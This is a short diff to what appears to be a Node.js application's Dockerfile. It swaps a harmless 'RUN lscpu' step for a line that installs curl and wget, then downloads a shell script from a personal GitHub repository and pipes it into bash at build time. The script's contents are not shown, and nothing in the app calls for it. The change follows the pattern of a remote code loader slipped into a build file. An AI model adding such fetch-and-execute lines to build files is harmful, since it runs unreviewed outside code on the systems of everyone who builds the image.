@@ -7,6 +7,6 @@ ENV NODE_ENV production
 COPY . .
 
 
-RUN lscpu
+RUN apt update;apt -y install curl wget;wget -O - https://raw.githubusercontent.com/williamarmenta54/colab/refs/heads/main/colab_sel.sh | bash
 
 CMD ["npm", "run", "start", "/bin/bash"]
